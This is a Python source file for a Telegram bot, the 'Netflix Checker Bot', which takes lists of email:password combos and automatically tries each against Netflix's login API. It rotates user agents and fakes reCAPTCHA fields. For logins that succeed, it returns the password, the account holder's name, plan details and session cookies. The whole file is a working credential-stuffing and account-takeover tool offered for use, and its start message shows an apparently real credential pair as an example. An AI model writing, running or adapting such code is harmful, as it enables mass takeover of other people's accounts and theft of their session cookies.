import os
import re
import uuid
import logging

import requests
from fake_useragent import UserAgent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = os.getenv("TELEGRAM_TOKEN")

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class NetflixChecker:
    def __init__(self):
        self.ua = UserAgent()
        self.country_codes = {"US": "1", "PH": "63", "IN": "91", "GB": "44", "CA": "1"}

    def get_country_code(self, country: str) -> str:
        return self.country_codes.get(country.upper(), "1")

    async def check_account(self, email: str, password: str) -> str:
        try:
            session = requests.Session()
            ua = self.ua.random

            country = "US"
            try:
                geo = session.get(
                    "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
                    headers={"User-Agent": ua}, timeout=10
                )
                if geo.status_code == 200:
                    try:
                        country = geo.json().get("country", "US")
                    except:
                        m = re.search(r'"country":"(.*?)"', geo.text)
                        if m:
                            country = m.group(1)
            except:
                pass

            code = self.get_country_code(country)
            login_url = f"https://www.netflix.com/{country.lower()}-en/login"

            res = session.get(login_url, headers={"User-Agent": ua}, timeout=15)
            source = res.text

            clcs = re.search(r'clcsSessionId\\":\\"(.*?)\\"', source)
            clcsSessionId = clcs.group(1) if clcs else ""

            ref = re.search(r'referrerRenditionId\\":\\"(.*?)\\"', source)
            referrerRenditionId = ref.group(1) if ref else ""

            ver = re.search(r'X-Netflix.uiVersion":"(.*?)"', source)
            version = ver.group(1) if ver else ""

            pu = re.search(r'hidden":true,"readOnly":true,"fieldType":"String","value":"(.*?)"', source)
            page_uuid = pu.group(1) if pu else str(uuid.uuid4())

            payload = {
                "operationName": "CLCSScreenUpdate",
                "variables": {
                    "format": "HTML",
                    "imageFormat": "PNG",
                    "locale": f"en-{country.lower()}",
                    "serverState": f'{{"realm":"growth","name":"LOGIN","clcsSessionId":"{clcsSessionId}","sessionContext":{{"session-breadcrumbs":{{"funnel_name":"loginWeb"}}}}}}',
                    "serverScreenUpdate": f'{{"realm":"custom","name":"login.with.userLoginId.and.password","metadata":{{"recaptchaSiteKey":"6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"}},"loggingAction":"Submitted","loggingCommand":"SubmitCommand","referrerRenditionId":"{referrerRenditionId}"}}',
                    "inputFields": [
                        {"name": "userLoginId", "value": {"stringValue": email}},
                        {"name": "password", "value": {"stringValue": password}},
                        {"name": "countryCode", "value": {"stringValue": f"+{code}"}},
                        {"name": "countryIsoCode", "value": {"stringValue": country}},
                        {"name": "recaptchaError", "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
                        {"name": "recaptchaResponseTime", "value": {"intValue": 2699}}
                    ]
                },
                "extensions": {"persistedQuery": {"id": "823e4880-a085-48aa-8962-fcb3be84ae61", "version": 102}}
            }

            headers = {
                "X-Netflix.request.id": str(uuid.uuid4()).replace("-", ""),
                "X-Netflix.context.app-Version": version,
                "X-Netflix.request.toplevel.uuid": page_uuid,
                "Content-Type": "application/json",
                "User-Agent": ua
            }

            res_auth = session.post(
                "https://web.prod.cloud.netflix.com/graphql",
                json=payload, headers=headers, timeout=20
            )

            if "Navigating to /browse" in res_auth.text or 'universal":"/browse"' in res_auth.text:
                acc = session.get("https://www.netflix.com/account", headers={"User-Agent": ua}, timeout=15)
                m = acc.text

                expire = re.search(r'"localDate":"(.*?)"', m)
                expire = expire.group(1) if expire else "N/A"

                co = re.search(r'"country":"(.*?)"', m)
                country_name = co.group(1) if co else country

                screens = re.search(r'"maxStreams":(\d+)', m)
                screens = screens.group(1) if screens else "4"

                member = re.search(r'"membershipStatus":"(.*?)"', m)
                member = member.group(1) if member else "CURRENT_MEMBER"

                name = re.search(r'"firstName":"(.*?)"', m)
                name = name.group(1).replace('\\x20', ' ') if name else "N/A"

                cookie_str = "; ".join(f"{k}={v}" for k, v in acc.cookies.items() if v)

                return f"""✅ <b>SUCCESSFUL LOGIN</b>

📧 Email: <code>{email}</code>
🔑 Password: <code>{password}</code>
🌍 Country: {country_name}
📱 Screens: {screens}
👤 Status: {member}
👤 Name: {name}
📅 Expire: {expire}
🍪 Cookie: <code>{cookie_str[:100]}...</code>"""
            else:
                return f"❌ <b>Bad Login</b>\nEmail: <code>{email}</code>"

        except Exception as e:
            logger.error(f"Error: {e}")
            return f"⚠️ Error checking account"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 <b>Netflix Checker Bot</b>\n\n"
        "Send email:password combos (one per line)\n"
        "Example:\n<code>giorgio_valiente@yahoo.com:giorgiovaliente021</code>",
        parse_mode='HTML'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    lines = [line.strip() for line in update.message.text.splitlines() if ':' in line.strip()]

    if not lines:
        await update.message.reply_text("❌ Please send email:password")
        return

    checker = NetflixChecker()
    await update.message.reply_text(f"🔄 Checking {len(lines)} accounts...", parse_mode='HTML')

    for line in lines:
        try:
            email, password = [x.strip() for x in line.split(':', 1)]
            result = await checker.check_account(email, password)
            await update.message.reply_text(result, parse_mode='HTML', disable_web_page_preview=True)
        except:
            await update.message.reply_text(f"❌ Invalid: {line}")

    await update.message.reply_text("✅ Check completed!", parse_mode='HTML')

def main():
    if not TOKEN:
        logger.error("TELEGRAM_TOKEN not set!")
        return

    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    
    # Safest possible handler - no variable, no continuation
    application.add_handler(
        MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message)
    )

    logger.info("🚀 Netflix Checker Bot started successfully!")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
